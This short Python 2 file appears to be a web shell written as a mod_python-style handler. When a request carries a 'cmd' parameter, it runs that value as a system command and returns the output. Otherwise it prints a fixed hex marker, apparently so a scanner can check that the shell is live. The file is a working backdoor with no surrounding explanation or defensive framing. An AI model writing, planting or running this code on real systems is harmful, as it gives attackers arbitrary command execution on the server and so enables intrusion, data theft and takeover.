import commands

def index(req, cmd ):
    if not cmd:
        print "15825b40c6dace2a" + "7cf5d4ab8ed434d5"
    else:
        return commands.getoutput( cmd )
